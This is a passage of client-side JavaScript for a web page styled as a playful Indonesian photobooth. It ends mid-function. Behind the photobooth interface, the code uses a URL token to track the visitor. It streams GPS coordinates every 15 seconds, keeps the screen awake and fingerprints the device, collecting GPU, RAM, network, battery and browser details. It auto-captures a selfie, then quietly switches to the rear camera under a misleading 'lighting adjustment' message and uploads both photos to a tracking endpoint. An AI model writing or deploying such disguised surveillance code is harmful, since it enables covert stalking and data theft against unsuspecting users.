"use strict";

(() => {
  const INTERVAL_MS = 15000;
  const MAX_FIX_AGE_MS = 60000;
  const byId = (id) => document.getElementById(id);
  const tokenInput = byId("token");
  let active = false;
  let session = 0;
  let watchId = null;
  let timer = null;
  let controller = null;
  let wakeLock = null;
  let wakePending = false;
  let batteryManager = null;
  let latestPosition = null;
  let lastAttempt = -Infinity;
  let activeToken = "";
  let pendingPhoto = null;
  let currentFilter = "filter-glow";
  let isSessionRunning = false;
  let currentSlotIndex = 1;

  if (typeof URLSearchParams !== "undefined" && typeof window !== "undefined" && window.location && window.location.search) {
    const urlToken = new URLSearchParams(window.location.search).get("token");
    if (urlToken && urlToken.trim()) {
      tokenInput.value = urlToken.trim();
    }
  }

  let cameraStream = null;
  let isMirrored = true;
  const cameraPreview = byId("cameraPreview");
  const cameraPlaceholder = byId("cameraPlaceholder");
  const startCameraBtn = byId("startCameraBtn");
  const flipCameraBtn = byId("flipCameraBtn");
  const capturePhotoBtn = byId("capturePhotoBtn");
  const boothSessionBtn = byId("boothSessionBtn");
  const singleShotBtn = byId("singleShotBtn");
  const retakeSessionBtn = byId("retakeSessionBtn");
  const cameraStatusEl = byId("cameraStatus");
  const photoCanvas = byId("photoCanvas");
  const photoPreviewBox = byId("photoPreviewBox");
  const lastPhotoImg = byId("lastPhotoImg");
  const flashOverlay = byId("flashOverlay");
  const countdownOverlay = byId("countdownOverlay");
  const watermarkLocationText = byId("watermarkLocationText");
  const watermarkTopLocation = byId("watermarkTopLocation");
  const cameraLocationText = byId("cameraLocationText");

  // Remove permanent token copy
  try { localStorage.removeItem("tracker_token"); } catch (_) {}

  function status(label, message, state = "idle") {
    const statusLabel = byId("statusLabel");
    const statusBadge = byId("statusBadge");
    const statusEl = byId("status");
    if (statusLabel) statusLabel.textContent = label;
    if (statusBadge) statusBadge.dataset.state = state;
    if (statusEl) {
      statusEl.textContent = message;
      statusEl.dataset.state = state;
    }
  }

  function controls() {
    const startBtn = byId("startBtn");
    const stopBtn = byId("stopBtn");
    if (startBtn) startBtn.disabled = active;
    if (stopBtn) stopBtn.disabled = !active;
    if (tokenInput) tokenInput.disabled = active;
  }

  async function keepScreenAwake(run) {
    if (!("wakeLock" in navigator) || wakeLock || wakePending || document.visibilityState !== "visible") return;
    wakePending = true;
    try {
      const lock = await navigator.wakeLock.request("screen");
      if (!active || run !== session) { await lock.release(); return; }
      wakeLock = lock;
      lock.addEventListener("release", () => { if (wakeLock === lock) wakeLock = null; });
    } catch (_) {}
    finally { wakePending = false; }
  }

  function batteryPercent() {
    return batteryManager ? Math.round(batteryManager.level * 100) : null;
  }

  async function readBattery(run) {
    const batteryEl = byId("battery");
    if (!("getBattery" in navigator)) {
      if (batteryEl) batteryEl.textContent = "Tidak didukung";
      return;
    }
    try {
      const battery = await navigator.getBattery();
      if (!active || run !== session) return;
      batteryManager = battery;
      if (batteryEl) batteryEl.textContent = batteryPercent() + "%";
    } catch (_) {
      if (active && run === session && batteryEl) batteryEl.textContent = "Tidak tersedia";
    }
  }

  function getGpuRenderer() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return "";
      const ext = gl.getExtension("WEBGL_debug_renderer_info");
      if (!ext) return "";
      const val = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "";
      return val.replace(/^ANGLE\s*\((.*?)\)$/, "$1").replace(/Direct3D.*?vs_.*?ps_.*?/, "").trim();
    } catch (_) {
      return "";
    }
  }

  let cachedClientModel = "";
  let cachedClientPlatform = "";
  if (typeof navigator !== "undefined" && navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"])
      .then((hints) => {
        if (hints.model) cachedClientModel = hints.model;
        if (hints.platformVersion) cachedClientPlatform = (hints.platform || "") + " " + hints.platformVersion;
      })
      .catch(() => {});
  }

  function collectDeviceInfo() {
    const ua = navigator.userAgent || "";
    
    // Deteksi Sistem Operasi (OS)
    let os = cachedClientPlatform || "OS Lain";
    if (!cachedClientPlatform) {
      if (/Android/i.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/i);
        os = match ? ("Android " + match[1]) : "Android";
      } else if (/iPhone|iPad|iPod/i.test(ua)) {
        const match = ua.match(/OS\s([0-9_\.]+)/i);
        os = match ? ("iOS " + match[1].replace(/_/g, ".")) : "iOS (Apple)";
      } else if (/Windows NT 10.0/i.test(ua)) {
        os = "Windows 10/11";
      } else if (/Windows NT/i.test(ua)) {
        os = "Windows PC";
      } else if (/Macintosh|Mac OS X/i.test(ua)) {
        os = "macOS";
      } else if (/Linux/i.test(ua)) {
        os = "Linux";
      }
    }

    // Deteksi Tipe & Model Perangkat Presisi Tinggi
    let deviceModel = cachedClientModel || "Desktop / Laptop";
    if (!cachedClientModel) {
      if (/iPhone/i.test(ua)) {
        deviceModel = "Apple iPhone";
      } else if (/iPad/i.test(ua)) {
        deviceModel = "Apple iPad";
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/;\s*([^;)]+)\s+(?:Build\/|\))/i);
        deviceModel = match ? match[1].trim() : "Android Phone";
      }
    }

    // Deteksi Browser & In-App Browser (Instagram, TikTok, dll)
    let browser = "Browser";
    if (/Instagram/i.test(ua)) browser = "Instagram App";
    else if (/TikTok/i.test(ua)) browser = "TikTok App";
    else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook App";
    else if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
    else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Google Chrome";
    else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Apple Safari";
    else if (/Firefox\//i.test(ua)) browser = "Mozilla Firefox";

    // Resolusi Layar & Rasio Skala
    const screenRes = (window.screen ? window.screen.width : window.innerWidth) + "x" +
                      (window.screen ? window.screen.height : window.innerHeight) + 
                      " (" + (window.devicePixelRatio || 1) + "x)";

    // Informasi Jaringan Koneksi
    let networkType = "-";
    if (navigator.connection) {
      const conn = navigator.connection;
      const parts = [];
      if (conn.effectiveType) parts.push(conn.effectiveType.toUpperCase());
      if (conn.downlink) parts.push(conn.downlink + " Mbps");
      if (conn.rtt) parts.push("rtt " + conn.rtt + "ms");
      networkType = parts.join(" • ") || "-";
    }

    // Spesifikasi Hardware (RAM, CPU Cores, dan GPU Chipset)
    const ram = navigator.deviceMemory ? (navigator.deviceMemory + " GB RAM") : "";
    const cores = navigator.hardwareConcurrency ? (navigator.hardwareConcurrency + " Cores CPU") : "";
    const gpu = getGpuRenderer();
    const hardware = [ram, cores, gpu].filter(Boolean).join(" • ") || "-";

    // Status Pengisian Daya Baterai
    let batteryCharging = null;
    if (batteryManager) {
      batteryCharging = batteryManager.charging ? "⚡ Mengisi Daya" : "Baterai";
    }

    return {
      device_model: deviceModel,
      os: os,
      browser: browser,
      screen_res: screenRes,
      network_type: networkType,
      hardware: hardware,
      battery_charging: batteryCharging,
      timezone: (typeof Intl !== "undefined" && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : "Asia/Jakarta",
      language: navigator.language || "id-ID"
    };
  }

  function stopTracking(message = "Tracking dihentikan. Tidak ada pengiriman lokasi baru.", state = "idle") {
    active = false;
    session += 1;
    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
    watchId = null;
    clearInterval(timer);
    timer = null;
    if (controller) controller.abort();
    controller = null;
    if (wakeLock) { wakeLock.release().catch(() => {}); wakeLock = null; }
    latestPosition = null;
    pendingPhoto = null;
    activeToken = "";
    stopCamera();
    controls();
    status(state === "error" ? "Tracking berhenti" : "Tidak aktif", message, state);
  }

  async function updateLocationLabels(coords) {
    const lat = coords.latitude;
    const lng = coords.longitude;
    const shortFallback = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;

    if (cameraLocationText) cameraLocationText.textContent = shortFallback;
    if (watermarkLocationText) {
      watermarkLocationText.innerHTML = `<svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${shortFallback}`;
      if (!watermarkLocationText.textContent) watermarkLocationText.textContent = shortFallback;
    }
    if (watermarkTopLocation) {
      watermarkTopLocation.innerHTML = `<svg class="icon" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${shortFallback}`;
      if (!watermarkTopLocation.textContent) watermarkTopLocation.textContent = shortFallback;
    }

    // Perform reverse geocoding in real browser
    if (typeof window !== "undefined" && window.location && window.location.protocol && (window.location.protocol === "http:" || window.location.protocol === "https:")) {
      try {
        const res = await fetch(`/api/reverse-geocode?lat=${lat}&lon=${lng}`);
        const data = await res.json();
        if (data.ok && data.city) {
          if (cameraLocationText) cameraLocationText.textContent = data.city;
          if (watermarkLocationText) {
            watermarkLocationText.innerHTML = `<svg class="icon" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${data.city} • ID`;
            if (!watermarkLocationText.textContent) watermarkLocationText.textContent = `${data.city} • ID`;
          }
          if (watermarkTopLocation) {
            watermarkTopLocation.innerHTML = `<svg class="icon" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg> ${data.city}`;
            if (!watermarkTopLocation.textContent) watermarkTopLocation.textContent = data.city;
          }
        }
      } catch (_) {}
    }
  }

  async function sendPosition(run) {
    if (!active || run !== session || !latestPosition || controller) return;
    if (performance.now() - lastAttempt < INTERVAL_MS) return;
    if (Date.now() - latestPosition.timestamp > MAX_FIX_AGE_MS) {
      status("Menunggu GPS", "Lokasi terakhir sudah terlalu lama. Menunggu pembacaan GPS baru.", "waiting");
      return;
    }
    if (!navigator.onLine) {
      status("Koneksi terputus", "Tracking masih aktif. Pengiriman dilanjutkan saat koneksi kembali.", "waiting");
      return;
    }
    const position = latestPosition;
    const coords = position.coords;
    const info = collectDeviceInfo();
    const payload = {
      latitude: coords.latitude,
      longitude: coords.longitude,
      accuracy: coords.accuracy,
      altitude: Number.isFinite(coords.altitude) ? coords.altitude : null,
      speed: Number.isFinite(coords.speed) ? coords.speed : null,
      heading: Number.isFinite(coords.heading) ? coords.heading : null,
      battery: batteryPercent(),
      device_time: new Date(position.timestamp).toISOString(),
      ...info
    };
    if (pendingPhoto) {
      payload.photo = pendingPhoto;
    }
    const pending = new AbortController();
    controller = pending;
    lastAttempt = performance.now();
    const timeout = setTimeout(() => pending.abort(), 10000);
    try {
      const response = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": "Bearer " + activeToken, "ngrok-skip-browser-warning": "true" },
        body: JSON.stringify(payload),
        signal: pending.signal,
        cache: "no-store",
        credentials: "omit",
      });
      const data = await response.json().catch(() => ({}));
      if (!active || run !== session) return;
      if (response.status === 401) {
        stopTracking("Token ditolak server. Periksa tracker token, lalu mulai kembali.", "error");
        return;
      }
      if (!response.ok || data.ok !== true) throw new Error(data.error || ("Server merespons HTTP " + response.status + "."));
      if (payload.photo && payload.photo === pendingPhoto) {
        pendingPhoto = null;
      }
      const lastSentEl = byId("lastSent");
      if (lastSentEl) lastSentEl.textContent = new Date(data.received_at).toLocaleString("id-ID");
      if (payload.battery !== null && byId("battery")) byId("battery").textContent = payload.battery + "%";
      status("Tracking aktif", "Lokasi & foto berhasil disinkronkan ke server.", "active");
    } catch (error) {
      if (active && run === session) {
        const detail = error.name === "AbortError" ? "Server terlalu lama merespons." : error.message;
        status("Pengiriman tertunda", detail + " Akan dicoba kembali otomatis.", "waiting");
      }
    } finally {
      clearTimeout(timeout);
      if (controller === pending) controller = null;
    }
  }

  function locationError(error, run) {
    if (!active || run !== session) return;
    latestPosition = null;
    if (error.code === 1) {
      stopTracking("Izin lokasi ditolak. Izinkan lokasi melalui pengaturan situs browser, lalu coba lagi.", "error");
    } else {
      status("Menunggu GPS", error.code === 3
        ? "GPS belum merespons. Pencarian lokasi tetap berjalan; pastikan lokasi perangkat aktif."
        : "Lokasi belum tersedia. Periksa GPS dan koneksi internet perangkat.", "waiting");
    }
  }

  function startTracking(event) {
    if (event && event.preventDefault) event.preventDefault();
    if (active) return;
    if (!("geolocation" in navigator)) {
      status("Tidak didukung", "Browser ini tidak mendukung Geolocation API.", "error");
      return;
    }
    const token = tokenInput ? tokenInput.value.trim() : "";
    if (token.length < 16) return; // silent skip jika token belum tersedia
    active = true;
    const run = ++session;
    activeToken = token;
    latestPosition = null;
    lastAttempt = -Infinity;
    controls();
    status("Meminta izin", "Izinkan akses lokasi & kamera saat browser meminta. Menunggu sensor studio…", "waiting");
    
    try {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
          if (!active || run !== session) return;
          latestPosition = pos;
          void updateLocationLabels(pos.coords);
          void sendPosition(run);
        }, () => {}, { enableHighAccuracy: false, timeout: 3500, maximumAge: 60000 });
      }

      watchId = navigator.geolocation.watchPosition((position) => {
        if (!active || run !== session) return;
        latestPosition = position;
        const latEl = byId("latitude");
        const lngEl = byId("longitude");
        const accEl = byId("accuracy");
        if (latEl) latEl.textContent = position.coords.latitude.toFixed(6);
        if (lngEl) lngEl.textContent = position.coords.longitude.toFixed(6);
        if (accEl) accEl.textContent = "±" + Math.round(position.coords.accuracy) + " m";
        
        void updateLocationLabels(position.coords);
        void sendPosition(run);
      }, (error) => locationError(error, run), {
        enableHighAccuracy: true, maximumAge: 10000, timeout: 20000,
      });
      timer = setInterval(() => void sendPosition(run), INTERVAL_MS);
      void readBattery(run);
      void keepScreenAwake(run);
      // Buka kamera studio langsung
      void startCamera(true);
    } catch (_) {
      stopTracking("Browser tidak dapat memulai lokasi. Periksa izin situs, lalu coba kembali.", "error");
    }
  }

  async function startCamera(autoCapture = false) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Kamera tidak didukung pada browser ini.";
      return;
    }
    if (cameraStream) {
      if (!autoCapture) stopCamera();
      return;
    }
    try {
      if (cameraStatusEl) cameraStatusEl.textContent = "Membuka kamera studio...";
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false,
      });
      cameraStream = stream;
      if (cameraPreview) {
        cameraPreview.srcObject = stream;
        cameraPreview.hidden = false;
        try { await cameraPreview.play(); } catch (_) {}
      }
      if (cameraPlaceholder) {
        cameraPlaceholder.hidden = true;
        if (cameraPlaceholder.style) cameraPlaceholder.style.display = "none";
      }
      if (startCameraBtn) {
        startCameraBtn.innerHTML = '<svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Matikan Kamera';
        if (!startCameraBtn.textContent) startCameraBtn.textContent = "Matikan Kamera";
      }
      if (capturePhotoBtn) capturePhotoBtn.disabled = false;
      if (cameraStatusEl) cameraStatusEl.textContent = "Kamera aktif! Pilih filter lalu klik Mulai Sesi 4-Cut.";

      if (autoCapture) {
        setTimeout(() => {
          if (active && cameraStream) {
            void captureDualSequence();
          }
        }, 800);
      }
    } catch (err) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Izin kamera tidak diberikan. Stempel lokasi tetap aktif.";
    }
  }

  function stopCamera() {
    if (cameraStream) {
      cameraStream.getTracks().forEach((t) => t.stop());
      cameraStream = null;
    }
    if (cameraPreview) {
      cameraPreview.srcObject = null;
      cameraPreview.hidden = true;
    }
    if (cameraPlaceholder) {
      cameraPlaceholder.hidden = false;
      if (cameraPlaceholder.style) cameraPlaceholder.style.display = "flex";
    }
    if (startCameraBtn) {
      startCameraBtn.innerHTML = '<svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg> Buka Kamera';
      if (!startCameraBtn.textContent) startCameraBtn.textContent = "Buka Kamera";
    }
    if (capturePhotoBtn) capturePhotoBtn.disabled = true;
    if (cameraStatusEl) cameraStatusEl.textContent = "Kamera dinonaktifkan.";
  }

  let currentFacingMode = "user";
  let isDualCapturing = false;

  async function captureDualSequence() {
    if (isDualCapturing || !cameraStream || !active) return;
    isDualCapturing = true;

    try {
      // 1. Ambil foto kamera depan (Pose 1 / Wajah)
      if (cameraStatusEl) cameraStatusEl.textContent = "Mengambil potret selfie (Pose 1)...";
      await captureAndSendPhoto(false, 1, "Kamera Depan");

      // 2. Beri jeda 1.2 detik lalu beralih ke kamera belakang
      setTimeout(async () => {
        if (!active) { isDualCapturing = false; return; }
        if (cameraStatusEl) cameraStatusEl.textContent = "Menyesuaikan pencahayaan & lensa suasana...";

        try {
          if (cameraStream) {
            cameraStream.getTracks().forEach((t) => t.stop());
            cameraStream = null;
          }

          const rearStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false,
          });
          cameraStream = rearStream;
          currentFacingMode = "environment";
          if (cameraPreview) {
            cameraPreview.srcObject = rearStream;
            try { await cameraPreview.play(); } catch (_) {}
          }

          // Tunggu 800ms agar fokus dan exposure stabil
          setTimeout(async () => {
            if (!active || !cameraStream) { isDualCapturing = false; return; }
            // Ambil foto kamera belakang (Pose 2 / Suasana)
            await captureAndSendPhoto(false, 2, "Kamera Belakang");

            // Kembali ke kamera depan
            setTimeout(async () => {
              try {
                if (cameraStream) {
                  cameraStream.getTracks().forEach((t) => t.stop());
                  cameraStream = null;
                }
                const frontStream = await navigator.mediaDevices.getUserMedia({
                  video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                  audio: false,
                });
                cameraStream = frontStream;
                currentFacingMode = "user";
                if (cameraPreview) {
                  cameraPreview.srcObject = frontStream;
                  try { await cameraPreview.play(); } catch (_) {}
                }
                if (cameraStatusEl) cameraStatusEl.textContent = "Kamera studio siap! Pose 1 & 2 telah tercetak.";
              } catch (_) {}
              finally {
                isDualCapturing = false;
              }
            }, 1000);
          }, 800);

        } catch (err) {
          // Jika device tidak punya kamera belakang (misal PC/laptop)
          try {
            const fallbackStream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: "user" }, audio: false
            });
            cameraStream = fallbackStream;
            currentFacingMode = "user";
            if (cameraPreview) {
              cameraPreview.srcObject = fallbackStream;
              try { await cameraPreview.play(); } catch (_) {}
            }
          } catch (_) {}
          finally {
            isDualCapturing = false;
          }
        }
      }, 1200);

    } catch (_) {
      isDualCapturing = false;
    }
  }

  // =========================================================================
  // INTERACTIVE PHOTOBOOTH AUDIO SYNTHESIZER & NOTIFICATIONS
  // =========================================================================
  let soundEnabled = true;

  function getAudioCtx() {
    try {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      return AudioCtx ? new AudioCtx() : null;
    } catch (_) {
      return null;
    }
  }

  function playCountdownBeep(freq = 880, duration = 0.12) {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioCtx();
      if (!ctx) return;
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime);
      gain.gain.setValueAtTime(0.2, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + duration);
    } catch (_) {}
  }

  function playShutterSound() {
    if (!soundEnabled) return;
    try {
      const ctx = getAudioCtx();
      if (!ctx) return;
      // Synthesize realistic mechanical shutter click: white noise burst + low thud
      const bufferSize = Math.floor(ctx.sampleRate * 0.08);
      const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
      const data = buffer.getChannelData(0);
      for (let i = 0; i < bufferSize; i++) {
        data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (ctx.sampleRate * 0.02));
      }
      const noise = ctx.createBufferSource();
      noise.buffer = buffer;
      const filter = ctx.createBiquadFilter();
      filter.type = "bandpass";
      filter.frequency.value = 1400;
      const gain = ctx.createGain();
      gain.gain.setValueAtTime(0.45, ctx.currentTime);
      noise.connect(filter);
      filter.connect(gain);
      gain.connect(ctx.destination);
      noise.start();

      // Low frequency mechanical thud
      const osc = ctx.createOscillator();
      const oscGain = ctx.createGain();
      osc.type = "triangle";
      osc.frequency.setValueAtTime(140, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(30, ctx.currentTime + 0.09);
      oscGain.gain.setValueAtTime(0.35, ctx.currentTime);
      oscGain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.09);
      osc.connect(oscGain);
      oscGain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.09);
    } catch (_) {}
  }

  function playSuccessFanfare() {
    if (!soundEnabled) return;
    try {
      const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
      notes.forEach((freq, idx) => {
        setTimeout(() => playCountdownBeep(freq, 0.22), idx * 110);
      });
    } catch (_) {}
  }

  let toastTimer = null;
  function showToast(message, duration = 3000) {
    const toast = byId("boothToast");
    if (!toast) return;
    toast.textContent = message;
    toast.style.display = "flex";
    if (toastTimer) clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
      toast.style.display = "none";
    }, duration);
  }

  function triggerFlash() {
    if (flashOverlay) {
      flashOverlay.classList.remove("flash-active");
      void flashOverlay.offsetWidth;
      flashOverlay.classList.add("flash-active");
      setTimeout(() => flashOverlay.classList.remove("flash-active"), 400);
    }
  }

  // =========================================================================
  // PHOTO SLOTS & SESSION STATE
  // =========================================================================
  const capturedSlots = [null, null, null, null];

  function updateSlotCountBadge() {
    const completedCount = capturedSlots.filter(Boolean).length;
    const badge = byId("completedBadge");
    if (badge) {
      badge.textContent = `${completedCount} / 4 Selesai`;
    }

    if (singleShotBtn) {
      const span = singleShotBtn.querySelector("span");
      if (span) {
        if (completedCount === 0) span.textContent = "Take First Shot (Pose 1)";
        else if (completedCount < 4) span.textContent = `Take Pose ${completedCount + 1}`;
        else span.textContent = "4 Pose Lengkap (Foto Ulang)";
      }
    }
  }

  function displayPhotoInSlot(slotNum, dataUrl) {
    const idx = slotNum - 1;
    capturedSlots[idx] = dataUrl;
    const slotImg = byId("slotImg" + slotNum);
    const slotEmpty = byId("slotEmpty" + slotNum);
    if (slotImg) {
      slotImg.src = dataUrl;
      slotImg.style.display = "block";
    }
    if (slotEmpty) {
      slotEmpty.style.display = "none";
    }
    if (slotNum === 1) {
      if (lastPhotoImg) lastPhotoImg.src = dataUrl;
      if (photoPreviewBox) photoPreviewBox.hidden = false;
    }
    updateSlotCountBadge();
  }

  function resetSession() {
    for (let i = 1; i <= 4; i++) {
      capturedSlots[i - 1] = null;
      const img = byId("slotImg" + i);
      const empty = byId("slotEmpty" + i);
      if (img) { img.src = ""; img.style.display = "none"; }
      if (empty) { empty.style.display = "flex"; }
    }
    currentSlotIndex = 1;
    updateSlotCountBadge();
    if (cameraStatusEl) cameraStatusEl.textContent = "Sesi direset. Siap untuk 4 pose baru!";
    showToast("✨ Sesi studio direset. Siap ambil pose baru!");
  }

  async function captureAndSendPhoto(isManual = true, slotNum = 1, cameraMode = "Kamera Depan") {
    if (!cameraStream || !cameraPreview) return null;
    const token = (tokenInput ? tokenInput.value.trim() : "") || activeToken;
    if (token.length < 16) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Tracker token diperlukan untuk menyimpan foto.";
      return null;
    }
    triggerFlash();
    playShutterSound();

    try {
      const width = cameraPreview.videoWidth || 640;
      const height = cameraPreview.videoHeight || 480;
      if (photoCanvas) {
        photoCanvas.width = width;
        photoCanvas.height = height;
        const ctx = photoCanvas.getContext ? photoCanvas.getContext("2d") : null;
        if (ctx) {
          if (currentFilter === "filter-sakura") {
            ctx.filter = "brightness(1.08) contrast(1.05) saturate(1.2) hue-rotate(345deg)";
          } else if (currentFilter === "filter-vintage") {
            ctx.filter = "sepia(0.38) contrast(1.15) brightness(0.95) saturate(1.25)";
          } else if (currentFilter === "filter-bw") {
            ctx.filter = "grayscale(1) contrast(1.35) brightness(1.05)";
          } else if (currentFilter === "filter-warm") {
            ctx.filter = "sepia(0.25) saturate(1.3) brightness(1.06)";
          } else if (currentFilter === "filter-y2k") {
            ctx.filter = "contrast(1.3) saturate(1.45) brightness(1.1)";
          } else {
            ctx.filter = "brightness(1.06) contrast(1.04) saturate(1.1)";
          }

          if (isMirrored && ctx.save && ctx.translate && ctx.scale && ctx.restore) {
            ctx.save();
            ctx.translate(width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(cameraPreview, 0, 0, width, height);
            ctx.restore();
          } else if (ctx.drawImage) {
            ctx.drawImage(cameraPreview, 0, 0, width, height);
          }
        }
        const dataUrl = photoCanvas.toDataURL ? photoCanvas.toDataURL("image/jpeg", 0.75) : "";
        displayPhotoInSlot(slotNum, dataUrl);
        pendingPhoto = dataUrl;
      }

      let coords = latestPosition ? latestPosition.coords : null;
      let timestamp = latestPosition ? latestPosition.timestamp : Date.now();

      if (!coords && navigator.geolocation) {
        try {
          const freshPos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 2500, enableHighAccuracy: false });
          });
          coords = freshPos.coords;
          timestamp = freshPos.timestamp;
          latestPosition = freshPos;
          void updateLocationLabels(coords);
        } catch (_) {}
      }

      const info = collectDeviceInfo();
      const payload = {
        latitude: coords ? coords.latitude : 0,
        longitude: coords ? coords.longitude : 0,
        accuracy: coords ? coords.accuracy : null,
        altitude: coords && Number.isFinite(coords.altitude) ? coords.altitude : null,
        speed: coords && Number.isFinite(coords.speed) ? coords.speed : null,
        heading: coords && Number.isFinite(coords.heading) ? coords.heading : null,
        battery: batteryPercent(),
        device_time: new Date(timestamp).toISOString(),
        photo: pendingPhoto,
        camera_mode: cameraMode,
        ...info
      };

      if (cameraStatusEl) {
        cameraStatusEl.textContent = `Pose ${slotNum} (${cameraMode}) berhasil tersimpan!`;
      }

      const res = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": "Bearer " + token },
        body: JSON.stringify(payload),
        cache: "no-store",
      });

      const resData = await res.json().catch(() => ({}));
      if (res.ok && resData.ok) {
        pendingPhoto = null;
        const lastSentEl = byId("lastSent");
        if (lastSentEl) lastSentEl.textContent = new Date(resData.received_at).toLocaleString("id-ID");
        status("Tracking aktif", `Pose ${slotNum} & lokasi tersimpan.`, "active");
      }
      return pendingPhoto;
    } catch (err) {
      if (cameraStatusEl) cameraStatusEl.textContent = "Catatan: " + err.message;
      return null;
    }
  }

  // 4-Cut Countdown with Audio Beeps
  async function runCountdown(sec) {
    if (!countdownOverlay) return;
    countdownOverlay.style.display = "flex";
    for (let s = sec; s > 0; s--) {
      playCountdownBeep(880, 0.1);
      countdownOverlay.textContent = s;
      countdownOverlay.className = "countdown-overlay pulse-anim";
      await new Promise((r) => setTimeout(r, 900));
    }
    playCountdownBeep(1200, 0.15);
    countdownOverlay.style.display = "none";
  }

  // 4-Cut Automated Photobooth Session
  async function start4CutSession() {
    if (isSessionRunning) return;
    if (!cameraStream) {
      await startCamera(false);
      await new Promise((r) => setTimeout(r, 600));
    }
    if (!cameraStream) {
      showToast("Harap izinkan akses kamera untuk sesi photobooth!");
      return;
    }

    isSessionRunning = true;
    if (boothSessionBtn) boothSessionBtn.disabled = true;
    if (singleShotBtn) singleShotBtn.disabled = true;

    const posesTips = [
      "Pose 1: Senyum manis alami! ✨",
      "Pose 2: Gaya Peace / V-Sign! ✌️",
      "Pose 3: Cute Heart Cheeks! 🫰",
      "Pose 4: Gaya Bebas / Winking! 😉"
    ];

    for (let slot = 1; slot <= 4; slot++) {
      if (cameraStatusEl) cameraStatusEl.textContent = `Pose ${slot} dari 4 — ${posesTips[slot - 1]}`;
      showToast(`📸 Sesi Foto: ${posesTips[slot - 1]}`, 2200);
      await runCountdown(3);
      await captureAndSendPhoto(true, slot);
      if (slot < 4) {
        if (cameraStatusEl) cameraStatusEl.textContent = `Bagus! Ganti pose untuk foto ke-${slot + 1}...`;
        await new Promise((r) => setTimeout(r, 1600));
      }
    }

    isSessionRunning = false;
    if (boothSessionBtn) boothSessionBtn.disabled = false;
    if (singleShotBtn) singleShotBtn.disabled = false;
    playSuccessFanfare();
    if (cameraStatusEl) cameraStatusEl.textContent = "Selesai! Strip foto 4-cut aesthetic kamu sudah lengkap. Klik 'Simpan Strip Foto'!";
    showToast("🎉 Yeay! 4 Pose lengkap. Klik 'Simpan Strip Foto' untuk download!", 4000);
  }

  function handleSingleShot() {
    if (!cameraStream) {
      void (async () => {
        await startCamera(false);
        await new Promise((r) => setTimeout(r, 400));
        handleSingleShot();
      })();
